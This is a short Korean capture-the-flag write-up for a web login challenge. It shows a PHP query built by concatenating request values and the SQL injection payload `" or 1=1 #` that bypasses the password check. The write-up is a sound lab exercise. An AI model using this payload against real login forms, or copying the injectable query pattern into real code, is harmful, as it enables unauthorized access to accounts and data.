# Category

web

# Overview

username: <input>
password: <input>

# Analysis

- 입력한 `username`과 `password`를 `mysql`에서 조회해서 일치하는 값이 있다면 다음 비밀번호를 응답한다.

- 데이터베이스에서 가져오는 쿼리는 `where` 조건에 `username`과 `password`를 판별한다.

  ```php
  $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
  ```

  sql관점에서 쉽게 나타내면 아래와 같다.

  ```sql
  SELECT *
  from users
  where username="<$_REQUEST["username"]>"
  and password="<$_REQUEST["password"]>"
  ```

- `username`과 `password`의 AND 연산으로 되어있으며 이를 깨뜨리기 위해 `A AND B OR C` 와 같이 결과가 `True`인 반환식을 작성하면 조건이 일치하여 데이터를 가져올 수 있다.

# Exploitation

1. `username`은 사용할 필요가 없으니 공백으로 전달하고 `password` `input`에 `" or 1=1 #` 같이 전달하면 OR 조건에 password가 일치하는 모든 것을 가져오는 true가 되면서 전체적인 조건이 `false AND false OR true`가 되어 true를 반환하는 조건식이 된다.

   ```sql
   SELECT *
   from users
   where username="<>"
   and password="<" or 1=1 #>"
   ```

2. 데이터를 전달하면 다음 비밀번호를 획득할 수 있다.

# Flag

`Sd...vx`
